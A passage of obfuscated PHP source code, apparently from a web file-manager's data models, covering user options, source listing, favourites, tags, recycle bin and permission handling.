array($c¶¦¹–æ•[7], $aëºÁ¡°×‰)); $B×äÇĞ¬ÌŸ = Model($c¶¦¹–æ•[1801])->where($b¯‰Ôí´ÎŞ)->select(); goto A‡·İåº•ù; BçÃİĞÔì‡: foreach ($AÚàäçæ¼í as &$d¯…Šå¡) { $d¯…Šå¡[$c¶¦¹–æ•[1893]] = array(); if (isset($B×äÇĞ¬ÌŸ[$d¯…Šå¡[$c¶¦¹–æ•[1551]]])) { $d¯…Šå¡[$c¶¦¹–æ•[1893]] = $B×äÇĞ¬ÌŸ[$d¯…Šå¡[$c¶¦¹–æ•[1551]]]; } } unset($d¯…Šå¡); goto bØÄö‘˜Š‰; A‡·İåº•ù: $Eµçãˆ£ó¨ = array_to_keyvalue($B×äÇĞ¬ÌŸ, $c¶¦¹–æ•[33], $c¶¦¹–æ•[1720]); $Eµçãˆ£ó¨ = array_remove_value(array_unique($Eµçãˆ£ó¨), $c¶¦¹–æ•[191]); if (!$Eµçãˆ£ó¨ || !$B×äÇĞ¬ÌŸ) { return; } goto b”¦ÎÙŸ•; a¾‡ƒÒ®“ê: $B×äÇĞ¬ÌŸ = array_to_keyvalue_group($B×äÇĞ¬ÌŸ, $c¶¦¹–æ•[1551]); foreach ($B×äÇĞ¬ÌŸ as &$DİÎØ×öÈÀ) { $fÍÉÊ‹î‘ = array(); foreach ($DİÎØ×öÈÀ as $BÔÃˆ‹¯çŠ) { if (!$BÔÃˆ‹¯çŠ[$c¶¦¹–æ•[1815]]) { continue; } $cåĞ”î‘ö = Model($c¶¦¹–æ•[488])->listData($BÔÃˆ‹¯çŠ[$c¶¦¹–æ•[1815]]); $fÍÉÊ‹î‘[] = array($c¶¦¹–æ•[1720] => $BÔÃˆ‹¯çŠ[$c¶¦¹–æ•[1720]], $c¶¦¹–æ•[2186] => $B²ÏÁÌí©[$BÔÃˆ‹¯çŠ[$c¶¦¹–æ•[1720]]][$c¶¦¹–æ•[28]], $c¶¦¹–æ•[502] => $B²ÏÁÌí©[$BÔÃˆ‹¯çŠ[$c¶¦¹–æ•[1720]]][$c¶¦¹–æ•[502]], $c¶¦¹–æ•[406] => $cåĞ”î‘ö); } $DİÎØ×öÈÀ = $fÍÉÊ‹î‘; } unset($DİÎØ×öÈÀ); goto BçÃİĞÔì‡; b”¦ÎÙŸ•: $b¯‰Ôí´ÎŞ = array($c¶¦¹–æ•[1720] => array($c¶¦¹–æ•[7], $Eµçãˆ£ó¨)); $B²ÏÁÌí© = Model($c¶¦¹–æ•[1891])->field($c¶¦¹–æ•[2185])->where($b¯‰Ôí´ÎŞ)->select(); $B²ÏÁÌí© = array_to_keyvalue($B²ÏÁÌí©, $c¶¦¹–æ•[1720]); goto a¾‡ƒÒ®“ê; bØÄö‘˜Š‰: } private function _listAppendMeta(&$Cãò²Ãˆµ“, $DöóÕ „×ñ) { goto DäŠåÑŞñ…; e©§ßÖÀäÛ: foreach ($Eœ¼ÕÂ±ç as &$Eğøù“ì¿‹) { $aì¾ŸÜ®•ì = array(); foreach ($Eğøù“ì¿‹ as $D®Æ¦¹‹ÒŞ) { if (!in_array($D®Æ¦¹‹ÒŞ[$e¬øÍ·[93]], $BÄò×æï²)) { $aì¾ŸÜ®•ì[$D®Æ¦¹‹ÒŞ[$e¬øÍ·[93]]] = $D®Æ¦¹‹ÒŞ[$e¬øÍ·[372]]; } } $Eğøù“ì¿‹ = $aì¾ŸÜ®•ì; } unset($Eğøù“ì¿‹); $DÏ­œŒˆ‡´ = Model($e¬øÍ·[2187]); goto e¦˜§¬•¹; e¦˜§¬•¹: foreach ($Cãò²Ãˆµ“ as &$FÎá‚’¿·½) { $eï—¶ó³¢º = array(); if (isset($Eœ¼ÕÂ±ç[$FÎá‚’¿·½[$e¬øÍ·[1551]]])) { $eï—¶ó³¢º = $Eœ¼ÕÂ±ç[$FÎá‚’¿·½[$e¬øÍ·[1551]]]; } $FÎá‚’¿·½[$e¬øÍ·[2188]] = array(); if (isset($eï—¶ó³¢º[$CÕóö¶á¸Ä])) { $FÎá‚’¿·½[$e¬øÍ·[2188]] = $DÏ­œŒˆ‡´->getUserJobInfo($eï—¶ó³¢º[$CÕóö¶á¸Ä]); } } unset($FÎá‚’¿·½); goto F‘—«Í‡¿Ú; DäŠåÑŞñ…: $e¬øÍ· =& $_SERVER[ä°„ä°º]; $CÕóö¶á¸Ä = UserJobModel::JOB_KEY; $BÄò×æï² = array($e¬øÍ·[2165]); goto C‘÷†ŠÃÏŸ; C‘÷†ŠÃÏŸ: $d¡–ì…™õ = array($e¬øÍ·[1551] => array($e¬øÍ·[7], $DöóÕ „×ñ)); $Eœ¼ÕÂ±ç = Model($e¬øÍ·[2163])->where($d¡–ì…™õ)->select(); $Eœ¼ÕÂ±ç = array_to_keyvalue_group($Eœ¼ÕÂ±ç, $e¬øÍ·[1551]); goto e©§ßÖÀäÛ; F‘—«Í‡¿Ú: } protected function groupUserAll($dŒæˆ–‚¡Í) { $AËÍ©ùÑ¬» =& $_SERVER[ä°„ä°º]; if (!$dŒæˆ–‚¡Í) { return !1; } $d Ù”Ÿ¤¡š = Model($AËÍ©ùÑ¬»[1801])->field($AËÍ©ùÑ¬»[1551])->where(array($AËÍ©ùÑ¬»[1720] => array($AËÍ©ùÑ¬»[7], $dŒæˆ–‚¡Í)))->select(); $d Ù”Ÿ¤¡š = array_to_keyvalue($d Ù”Ÿ¤¡š, $AËÍ©ùÑ¬»[33], $AËÍ©ùÑ¬»[1551]); return array_unique($d Ù”Ÿ¤¡š); } public function userSearch($D’Ô‰‰, $f¿á„—š¼¶ = "\52") { return Model($_SERVER[ä°„ä°º][519])->where($D’Ô‰‰)->field($f¿á„—š¼¶)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($FôÜÑ¹›) { $Eïƒ³†Ø Û =& $_SERVER[ä°„ä°º]; if (!defined($Eïƒ³†Ø Û[454])) { define($Eïƒ³†Ø Û[454], 0); } return "\x55\163\145\162\117\x70\164\151\x6f\156\x5f{$FôÜÑ¹›}\137" . USER_ID; } protected function filterWhere($FÑ›ïâš‹£) { $cô¬²Â”İ =& $_SERVER[ä°„ä°º]; if (!defined($cô¬²Â”İ[454])) { define($cô¬²Â”İ[454], 0); } $FÑ›ïâš‹£[$cô¬²Â”İ[1551]] = USER_ID; return $FÑ›ïâš‹£; } public function cacheRemoveUser($d¶ÑÚ«‚ì, $e‡õà³îÚ) { return Cache::remove("\125\163\x65\x72\117\x70\x74\151\x6f\x6e\x5f{$d¶ÑÚ«‚ì}\137" . $e‡õà³îÚ); } protected function optionDefault($d£Ï‰Üö = '') { $fƒÒö¢¡Ä =& $_SERVER[ä°„ä°º]; if ($d£Ï‰Üö == $fƒÒö¢¡Ä[33]) { return $GLOBALS[$fƒÒö¢¡Ä[6]][$fƒÒö¢¡Ä[2189]]; } if ($d£Ï‰Üö == $fƒÒö¢¡Ä[2190]) { return $GLOBALS[$fƒÒö¢¡Ä[6]][$fƒÒö¢¡Ä[2191]]; } } } goto f«‘ÁÏ‘‚»; EŠ’‡ŠÊ„È: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\x6d\x65" => "\x69\x6f\137\x73\x6f\165\162\x63\145\137\155\145\x74\x61", "\x6d\145\164\141\106\x69\x65\x6c\144" => "\x73\x6f\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\124\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\163\x65\162\x74", "\146\x75\156\143\x74\151\x6f\x6e"), array("\143\162\x65\x61\164\x65\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\163\145\x72\164", "\146\x75\x6e\143\x74\x69\157\156"), array("\166\151\x65\167\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($f®å´’ÜÈ•) { return $this->listSource(array($_SERVER[ä°„ä°º][394] => $f®å´’ÜÈ•)); } public function typeName($B–ë‘á«Ö) { static $E¥á…¸êÀë = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $E¥á…¸êÀë[$B–ë‘á«Ö . $_SERVER[ä°„ä°º][33]]; } public function sourceListInfo($c£êõº…Ôê, $A«¿èÊÁâ = false) { goto dö½İµ±ˆÜ; Aå®¦íÎöÖ: if (!$c£êõº…Ôê) { return array(); } $dñÖÕ°³çÓ = $this->where(array($A‚˜¿«°³ˆ[395] => array($A‚˜¿«°³ˆ[7], $c£êõº…Ôê)))->select(); $this->_listDataApply($dñÖÕ°³çÓ, $A«¿èÊÁâ); goto Cš«’¢ò°; Cš«’¢ò°: return array_to_keyvalue($dñÖÕ°³çÓ, $A‚˜¿«°³ˆ[395]); goto cŞ¸‡¤¸ñÖ; dö½İµ±ˆÜ: $A‚˜¿«°³ˆ =& $_SERVER[ä°„ä°º]; $c£êõº…Ôê = $c£êõº…Ôê ? $c£êõº…Ôê : array(); $c£êõº…Ôê = array_filter(array_unique($c£êõº…Ôê)); goto Aå®¦íÎöÖ; cŞ¸‡¤¸ñÖ: } public function pathInfoFilter(&$a÷õÇÂóä§) { goto Díª“±ë„Ú; D–ù×Í¸: $a÷õÇÂóä§[$A‡éç£Õ½ß[76]] = $A‡éç£Õ½ß[401] . $a÷õÇÂóä§[$A‡éç£Õ½ß[395]] . $A‡éç£Õ½ß[402]; $a÷õÇÂóä§[$A‡éç£Õ½ß[29]] = $a÷õÇÂóä§[$A‡éç£Õ½ß[403]] == 1 ? $A‡éç£Õ½ß[77] : $A‡éç£Õ½ß[193]; $a÷õÇÂóä§[$A‡éç£Õ½ß[404]] = $this->typeName($a÷õÇÂóä§[$A‡éç£Õ½ß[404]]); goto EÍš«ñŒ¯; Díª“±ë„Ú: $A‡éç£Õ½ß =& $_SERVER[ä°„ä°º]; static $eèÉÜÆ¬² = false; static $AØ‹ÕøåÔ = false; goto fÕÍ©ñÉÔ»; Eš¾İŸçœ·: $a÷õÇÂóä§ = array_field_key($a÷õÇÂóä§, $FäÖÆ«ÑëÁ); return $a÷õÇÂóä§; goto a»›Û…÷Ù; EÍš«ñŒ¯: if ($a÷õÇÂóä§[$A‡éç£Õ½ß[403]] != 1) { $a÷õÇÂóä§[$A‡éç£Õ½ß[168]] = $a÷õÇÂóä§[$A‡éç£Õ½ß[405]]; unset($a÷õÇÂóä§[$A‡éç£Õ½ß[405]]); } $FäÖÆ«ÑëÁ = $eèÉÜÆ¬²; if (isset($a÷õÇÂóä§[$A‡éç£Õ½ß[406]]) && $a÷õÇÂóä§[$A‡éç£Õ½ß[406]][$A‡éç£Õ½ß[407]] == -1) { $FäÖÆ«ÑëÁ = $AØ‹ÕøåÔ; } goto Eš¾İŸçœ·; fÕÍ©ñÉÔ»: static $D²£‡ƒ‚ › = false; if (!$eèÉÜÆ¬²) { goto AÛÖë¸‘“è; AÛÖë¸‘“è: $côÛí˜Û = $A‡éç£Õ½ß[396]; $côÛí˜Û .= $A‡éç£Õ½ß[397]; $côÛí˜Û .= $A‡éç£Õ½ß[398]; goto c™ë·›“¼; CŸ…‹¾ä×Í: $AØ‹ÕøåÔ = array(); foreach ($eèÉÜÆ¬² as $B²œå µ°Ó) { if (in_array($B²œå µ°Ó, $aªµŸ‘ö„›)) { continue; } $AØ‹ÕøåÔ[] = $B²œå µ°Ó; } $D²£‡ƒ‚ › = explode($A‡éç£Õ½ß[47], $A‡éç£Õ½ß[400]); goto cÚ‚ÖÀÈò; c™ë·›“¼: $eí£Ûôµ°Ş = $A‡éç£Õ½ß[399]; $aªµŸ‘ö„› = explode($A‡éç£Õ½ß[47], $eí£Ûôµ°Ş); $eèÉÜÆ¬² = explode($A‡éç£Õ½ß[47], $côÛí˜Û); goto CŸ…‹¾ä×Í; cÚ‚ÖÀÈò: } foreach ($D²£‡ƒ‚ › as $EÍÀ—œ¢õ­) { if (isset($a÷õÇÂóä§[$EÍÀ—œ¢õ­])) { $a÷õÇÂóä§[$EÍÀ—œ¢õ­] = intval($a÷õÇÂóä§[$EÍÀ—œ¢õ­]); } } goto D–ù×Í¸; a»›Û…÷Ù: } public function listUserFav() { goto E†å©ß§½¯; bô«°Ú‹¼: $Dİ ‚Ğœ½… = array_to_keyvalue($Dİ ‚Ğœ½…, $eÚÀ“Ï’¥½[33], $eÚÀ“Ï’¥½[76]); if ($Dİ ‚Ğœ½…) { $cÚÎŒ®¨´ = $this->listSource(array($eÚÀ“Ï’¥½[410] => array($eÚÀ“Ï’¥½[411], $Dİ ‚Ğœ½…))); } $cÚÎŒ®¨´ = array_to_keyvalue($cÚÎŒ®¨´[$eÚÀ“Ï’¥½[367]], $eÚÀ“Ï’¥½[395]); goto BáéÁ®›Å‰; BáéÁ®›Å‰: foreach ($a‡Å…äŒÙ– as &$fø¤ÌßÓ‡ë) { $fø¤ÌßÓ‡ë = array($eÚÀ“Ï’¥½[412] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[393]], $eÚÀ“Ï’¥½[413] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[28]], $eÚÀ“Ï’¥½[414] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[76]], $eÚÀ“Ï’¥½[415] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[29]], $eÚÀ“Ï’¥½[416] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[194]], $eÚÀ“Ï’¥½[417] => $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[84]]); if ($fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[29]] == $eÚÀ“Ï’¥½[409] && $cÚÎŒ®¨´[$fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[76]]]) { $fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[85]] = $cÚÎŒ®¨´[$fø¤ÌßÓ‡ë[$eÚÀ“Ï’¥½[76]]]; } } unset($fø¤ÌßÓ‡ë); return $a‡Å…äŒÙ–; goto a°ÔˆÁçğà; E†å©ß§½¯: $eÚÀ“Ï’¥½ =& $_SERVER[ä°„ä°º]; $a‡Å…äŒÙ– = Model($eÚÀ“Ï’¥½[408])->listData(); $Dİ ‚Ğœ½… = array_filter_by_field($a‡Å…äŒÙ–, $eÚÀ“Ï’¥½[29], $eÚÀ“Ï’¥½[409]); goto bô«°Ú‹¼; a°ÔˆÁçğà: } public function listUserTag($D‚’´¸–Õ®) { goto d¥øÆ°ª¤İ; e½Í¡ÇÊßÈ: $DºöÜ÷–µ… = array(); foreach ($F‡Ü£èğ° as $c©ÖÀ…¬ÃÜ) { $f‚ğ¶‚‹ÀÑ = $c©ÖÀ…¬ÃÜ[$F¿ŒˆŞôÊÑ[76]]; if (!$f‚ğ¶‚‹ÀÑ) { continue; } if (!isset($DºöÜ÷–µ…[$f‚ğ¶‚‹ÀÑ])) { $DºöÜ÷–µ…[$f‚ğ¶‚‹ÀÑ] = array(); } $DºöÜ÷–µ…[$f‚ğ¶‚‹ÀÑ][] = $c©ÖÀ…¬ÃÜ[$F¿ŒˆŞôÊÑ[419]]; } $e´¯½‡¹ÓÕ = array(); goto eäğ†¿¦¹Ÿ; e±İ¸œÍ: $d‡Á«ÈÍì = array_to_keyvalue($EƒàÄ‹Ü¸ï[$F¿ŒˆŞôÊÑ[74]], $F¿ŒˆŞôÊÑ[33], $F¿ŒˆŞôÊÑ[395]); $a’±˜Âñò¨ = array_merge($d‡Á«ÈÍì, $c¦¡×Ì†Ó¦); foreach ($e´¯½‡¹ÓÕ as $f‚ğ¶‚‹ÀÑ) { if (!in_array($f‚ğ¶‚‹ÀÑ, $a’±˜Âñò¨)) { $Dêï‚[] = $f‚ğ¶‚‹ÀÑ; } } goto FÇ´ØÓïâƒ; d¥øÆ°ª¤İ: $F¿ŒˆŞôÊÑ =& $_SERVER[ä°„ä°º]; if ($D‚’´¸–Õ® && !is_array($D‚’´¸–Õ®)) { $D‚’´¸–Õ® = array($D‚’´¸–Õ®); } $F‡Ü£èğ° = Model($F¿ŒˆŞôÊÑ[418])->listData(); goto e½Í¡ÇÊßÈ; C‘ˆ…Ì©‹Í: if (!$EƒàÄ‹Ü¸ï || count($e´¯½‡¹ÓÕ) == $EƒàÄ‹Ü¸ï[$F¿ŒˆŞôÊÑ[364]][$F¿ŒˆŞôÊÑ[365]]) { return $EƒàÄ‹Ü¸ï; } $Dêï‚ = array(); $c¦¡×Ì†Ó¦ = array_to_keyvalue($EƒàÄ‹Ü¸ï[$F¿ŒˆŞôÊÑ[75]], $F¿ŒˆŞôÊÑ[33], $F¿ŒˆŞôÊÑ[395]); goto e±İ¸œÍ; eäğ†¿¦¹Ÿ: foreach ($DºöÜ÷–µ… as $BÖ¡Í½•’Ñ => $aÛ÷ŸÉØİ˜) { $EëŸŠÑÊ» = !0; if (!$D‚’´¸–Õ®) { $e´¯½‡¹ÓÕ[] = $BÖ¡Í½•’Ñ; continue; } foreach ($D‚’´¸–Õ® as $EÅÊ´Ç±â») { if (!in_array($EÅÊ´Ç±â», $aÛ÷ŸÉØİ˜)) { $EëŸŠÑÊ» = !1; break; } } if ($EëŸŠÑÊ») { $e´¯½‡¹ÓÕ[] = $BÖ¡Í½•’Ñ; } } if (!$e´¯½‡¹ÓÕ) { return array(); } $EƒàÄ‹Ü¸ï = $this->listSource(array($F¿ŒˆŞôÊÑ[410] => array($F¿ŒˆŞôÊÑ[411], $e´¯½‡¹ÓÕ))); goto C‘ˆ…Ì©‹Í; FÇ´ØÓïâƒ: if ($Dêï‚) { Model($F¿ŒˆŞôÊÑ[420])->removeBySource($Dêï‚); } return $EƒàÄ‹Ü¸ï; goto b™”·…ß·…; b™”·…ß·…: } public function listUserRecycle() { $BğïÌÈéöø =& $_SERVER[ä°„ä°º]; $båÅ«Äö—Ê = Model($BğïÌÈéöø[421])->listData(); if (!$båÅ«Äö—Ê) { return array(); } $DßªİŠØ”’ = array($BğïÌÈéöø[410] => array($BğïÌÈéöø[411], $båÅ«Äö—Ê), $BğïÌÈéöø[422] => 1); return $this->listSource($DßªİŠØ”’); } public function listSource($A£šœÒ•‡, $f‰­¯£ªî‹ = 3000) { goto f½­•±ùÊ¿; f½­•±ùÊ¿: $EÖ¯¾Îİ„© =& $_SERVER[ä°„ä°º]; if (!isset($A£šœÒ•‡[$EÖ¯¾Îİ„©[423]])) { $A£šœÒ•‡[$EÖ¯¾Îİ„©[423]] = 0; } $B¼ÚÁ¯î„‰ = $EÖ¯¾Îİ„©[424]; goto fº£¹Èì¿º; BïğàŞ§õŒ: return $CŠğ›ó‡‘ò; goto D†À®óÑÉƒ; fº£¹Èì¿º: $CŠğ›ó‡‘ò = $this->field($B¼ÚÁ¯î„‰)->_makeOrder()->where($A£šœÒ•‡)->selectPage($f‰­¯£ªî‹); $this->_listDataApply($CŠğ›ó‡‘ò[$EÖ¯¾Îİ„©[367]]); $this->_listMake($CŠğ›ó‡‘ò); goto BïğàŞ§õŒ; D†À®óÑÉƒ: } protected function _makeOrder() { goto b…Ğ’ŠÀ¡; CÚ¶µ’Ù‡È: $d‹êÎ“á³å = Input::get($fÃ’ìöö°Ø[436], $fÃ’ìöö°Ø[7], $döĞ°Å‘ ğ, array_keys($döÈÑª§ÔŒ)); if (!in_array($e†Â…é¹Ñô, array_keys($BÕ–¯Ì‡ù«))) { $e†Â…é¹Ñô = $fÃ’ìöö°Ø[28]; } if (!in_array($d‹êÎ“á³å, array_keys($döÈÑª§ÔŒ))) { $e†Â…é¹Ñô = $fÃ’ìöö°Ø[428]; } goto BÑò®ç¹æå; b…Ğ’ŠÀ¡: $fÃ’ìöö°Ø =& $_SERVER[ä°„ä°º]; $A¦æá°¢Â® = Model($fÃ’ìöö°Ø[425])->get($fÃ’ìöö°Ø[426]); $döĞ°Å‘ ğ = Model($fÃ’ìöö°Ø[425])->get($fÃ’ìöö°Ø[427]); goto aåëĞÈÆ‡à; aåëĞÈÆ‡à: $döÈÑª§ÔŒ = array($fÃ’ìöö°Ø[428] => $fÃ’ìöö°Ø[429], $fÃ’ìöö°Ø[430] => $fÃ’ìöö°Ø[431]); $BÕ–¯Ì‡ù« = array($fÃ’ìöö°Ø[28] => $fÃ’ìöö°Ø[28], $fÃ’ìöö°Ø[78] => $fÃ’ìöö°Ø[78], $fÃ’ìöö°Ø[168] => $fÃ’ìöö°Ø[405], $fÃ’ìöö°Ø[432] => $fÃ’ìöö°Ø[432], $fÃ’ìöö°Ø[433] => $fÃ’ìöö°Ø[434], $fÃ’ìöö°Ø[194] => $fÃ’ìöö°Ø[194], $fÃ’ìöö°Ø[84] => $fÃ’ìöö°Ø[84]); $e†Â…é¹Ñô = Input::get($fÃ’ìöö°Ø[435], $fÃ’ìöö°Ø[7], $A¦æá°¢Â®, array_keys($BÕ–¯Ì‡ù«)); goto CÚ¶µ’Ù‡È; BÑò®ç¹æå: if ($e†Â…é¹Ñô == $fÃ’ìöö°Ø[28]) { } $e³í ˜¨ÁÙ = $fÃ’ìöö°Ø[437] . $BÕ–¯Ì‡ù«[$e†Â…é¹Ñô] . $fÃ’ìöö°Ø[50] . $döÈÑª§ÔŒ[$d‹êÎ“á³å]; return $this->order(rtrim(trim($e³í ˜¨ÁÙ), $fÃ’ìöö°Ø[47])); goto d×ãğ÷ºÇ; d×ãğ÷ºÇ: } protected function _listDataApplyItem($eÁÕö¤ñè, $B—¼Îâ¹»  = false) { $cÌ‰áÉÓˆ­ = array($eÁÕö¤ñè); $this->_listDataApply($cÌ‰áÉÓˆ­, $B—¼Îâ¹» ); return $cÌ‰áÉÓˆ­[0]; } protected function _listDataApply(&$b¢ÓÏÕ‚ì×, $EÁ ˆ¾Öˆ¸ = false) { goto FîÅËƒ“·; CÎø‰ÔœÓ: $this->_listAppendUser($b¢ÓÏÕ‚ì×); $this->_listFilterInfo($b¢ÓÏÕ‚ì×, $EÁ ˆ¾Öˆ¸); $this->_listAppendAuthSecret($b¢ÓÏÕ‚ì×); goto CğóÒêÏãò; B”ØŒ¿Ì—¸: $this->_listAppendPath($b¢ÓÏÕ‚ì×); $this->_listAppendAuth($b¢ÓÏÕ‚ì×); $this->_listAppendSourceInfo($b¢ÓÏÕ‚ì×, $e™İ–œñÇ×); goto CÎø‰ÔœÓ; FîÅËƒ“·: $dÆ¡ÏÌ‘™ =& $_SERVER[ä°„ä°º]; if (!$b¢ÓÏÕ‚ì×) { $b¢ÓÏÕ‚ì× = array(); return; } $e™İ–œñÇ× = array_to_keyvalue($b¢ÓÏÕ‚ì×, $dÆ¡ÏÌ‘™[33], $dÆ¡ÏÌ‘™[395]); goto d”ÈÙß‰ò†; d”ÈÙß‰ò†: $e™İ–œñÇ× = array_unique($e™İ–œñÇ×); $this->_listSourceCache($b¢ÓÏÕ‚ì×); if (!$EÁ ˆ¾Öˆ¸) { $this->_listAppendMeta($b¢ÓÏÕ‚ì×, $e™İ–œñÇ×); $this->_listAppendFileMeta($b¢ÓÏÕ‚ì×, $e™İ–œñÇ×); $this->_listAppendChildren($b¢ÓÏÕ‚ì×, $e™İ–œñÇ×); } goto B”ØŒ¿Ì—¸; CğóÒêÏãò: } protected function _listSourceCache($Dµö„‚§ã) { $fèŒ¹×¥°Ò =& $_SERVER[ä°„ä°º]; foreach ($Dµö„‚§ã as $b·¨ĞÛ¦»’) { self::$cacheSourceInfo[$fèŒ¹×¥°Ò[438] . $b·¨ĞÛ¦»’[$fèŒ¹×¥°Ò[395]]] = $b·¨ĞÛ¦»’; } } protected function _listFilterInfo(&$A·‹±­ƒ«±, $a¥ÈŸÚ—’Ü = false) { $B©‹¹šˆÈ =& $_SERVER[ä°„ä°º]; foreach ($A·‹±­ƒ«± as &$Aíìâ¾˜Ñš) { $Aíìâ¾˜Ñš = $this->pathInfoFilter($Aíìâ¾˜Ñš); self::$cachePathInfo[$B©‹¹šˆÈ[439] . intval($a¥ÈŸÚ—’Ü) . $B©‹¹šˆÈ[440] . $Aíìâ¾˜Ñš[$B©‹¹šˆÈ[395]]] = $Aíìâ¾˜Ñš; } unset($Aíìâ¾˜Ñš); } protected function _listMake(&$e±¥±ÌÓß) { $F×šÍ‚¬Ø =& $_SERVER[ä°„ä°º]; $e±¥±ÌÓß[$F×šÍ‚¬Ø[75]] = array(); $e±¥±ÌÓß[$F×šÍ‚¬Ø[74]] = array(); foreach ($e±¥±ÌÓß[$F×šÍ‚¬Ø[367]] as $fˆ—Ø»Çá…) { $f„Ò×£®â = $fˆ—Ø»Çá…[$F×šÍ‚¬Ø[403]] == 1 ? $F×šÍ‚¬Ø[75] : $F×šÍ‚¬Ø[74]; $e±¥±ÌÓß[$f„Ò×£®â][] = $fˆ—Ø»Çá…; } unset($e±¥±ÌÓß[$F×šÍ‚¬Ø[367]]); } protected function _listAppendMeta(&$Dè¶Ÿ©Úì, $aÒÈƒÃ‹) { goto D Á”¤õğó; D Á”¤õğó: $b·Ç­°Á‚Ë =& $_SERVER[ä°„ä°º]; $EÒ½‹õÎ‘¸ = array($b·Ç­°Á‚Ë[410] => array($b·Ç­°Á‚Ë[411], $aÒÈƒÃ‹)); $bí¿±¼Íò = Model($b·Ç­°Á‚Ë[441])->field($b·Ç­°Á‚Ë[442])->where($EÒ½‹õÎ‘¸)->select(); goto e…êÏÃª™Ô; cµ¿àÔ˜Ñ“: foreach ($bí¿±¼Íò as $AèŞ¤óãî) { if (!isset($E©Ù’İÕË[$AèŞ¤óãî[$b·Ç­°Á‚Ë[395]]])) { $E©Ù’İÕË[$AèŞ¤óãî[$b·Ç­°Á‚Ë[395]]] = array(); } if (in_array($AèŞ¤óãî[$b·Ç­°Á‚Ë[93]], $a„Ë¼éøÂ†)) { continue; } $E©Ù’İÕË[$AèŞ¤óãî[$b·Ç­°Á‚Ë[395]]][$AèŞ¤óãî[$b·Ç­°Á‚Ë[93]]] = $AèŞ¤óãî[$b·Ç­°Á‚Ë[372]]; } foreach ($Dè¶Ÿ©Úì as &$B½¼öñÚè) { $B½¼öñÚè[$b·Ç­°Á‚Ë[445]] = !1; if (isset($E©Ù’İÕË[$B½¼öñÚè[$b·Ç­°Á‚Ë[395]]])) { $B½¼öñÚè[$b·Ç­°Á‚Ë[445]] = $E©Ù’İÕË[$B½¼öñÚè[$b·Ç­°Á‚Ë[395]]]; } if ($this->fileIsLock($B½¼öñÚè) && $B½¼öñÚè[$b·Ç­°Á‚Ë[406]]) { $CÛİ“°œêĞ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B½¼öñÚè[$b·Ç­°Á‚Ë[406]][$b·Ç­°Á‚Ë[407]] = AuthModel::authDisable($B½¼öñÚè[$b·Ç­°Á‚Ë[406]][$b·Ç­°Á‚Ë[407]], $CÛİ“°œêĞ); $B½¼öñÚè[$b·Ç­°Á‚Ë[406]][$b·Ç­°Á‚Ë[446]][$b·Ç­°Á‚Ë[406]] = $B½¼öñÚè[$b·Ç­°Á‚Ë[406]][$b·Ç­°Á‚Ë[407]]; } } unset($B½¼öñÚè); goto eŒ†ÚŸ·ëÎ; e…êÏÃª™Ô: if (!$bí¿±¼Íò) { return; } $a„Ë¼éøÂ† = array($b·Ç­°Á‚Ë[443], $b·Ç­°Á‚Ë[444]); $E©Ù’İÕË = array(); goto cµ¿àÔ˜Ñ“; eŒ†ÚŸ·ëÎ: } protected function _listAppendFileMeta(&$BÊĞÖì†¸Î, $bØË‹Øì‡ë) { goto c¡” –à¥ò; Dç ’Ã“ˆò: if (!$eÆó¶´õÊ¾) { return; } $eîÌÌ‰†× = array($DÖÍŒ­òŠ[448] => array($DÖÍŒ­òŠ[411], $eÆó¶´õÊ¾)); $eÚ¬Ã¥Ê«² = $DÖÍŒ­òŠ[449]; goto Cµí¯Å…æÇ; Cµí¯Å…æÇ: $f‰¦‰‚¥Ø = Model($DÖÍŒ­òŠ[450])->field($eÚ¬Ã¥Ê«²)->where($eîÌÌ‰†×)->select(); $f‰¦‰‚¥Ø = array_to_keyvalue($f‰¦‰‚¥Ø, $DÖÍŒ­òŠ[447]); $F•Ğ»¢¶ÌŒ = Model($DÖÍŒ­òŠ[451])->field($DÖÍŒ­òŠ[452])->where($eîÌÌ‰†×)->select(); goto DŠõğÑ”¥; DŠõğÑ”¥: $F•Ğ»¢¶ÌŒ = $F•Ğ»¢¶ÌŒ ? $F•Ğ»¢¶ÌŒ : array(); $CËƒ†§ÏÉ = array(); foreach ($F•Ğ»¢¶ÌŒ as $bœ±«Ş¤Ğ®) { if (!isset($CËƒ†§ÏÉ[$bœ±«Ş¤Ğ®[$DÖÍŒ­òŠ[447]]])) { $CËƒ†§ÏÉ[$bœ±«Ş¤Ğ®[$DÖÍŒ­òŠ[447]]] = array(); } $CËƒ†§ÏÉ[$bœ±«Ş¤Ğ®[$DÖÍŒ­òŠ[447]]][$bœ±«Ş¤Ğ®[$DÖÍŒ­òŠ[93]]] = $bœ±«Ş¤Ğ®[$DÖÍŒ­òŠ[372]]; } goto a°‹¾…ŠâÂ; a°‹¾…ŠâÂ: foreach ($BÊĞÖì†¸Î as &$EºÑÂß¶É) { goto e“Ê‡½‡³; c„®ñ‰°Û: $D•Œæ›œ¿[$DÖÍŒ­òŠ[78]] = $EºÑÂß¶É[$DÖÍŒ­òŠ[78]]; 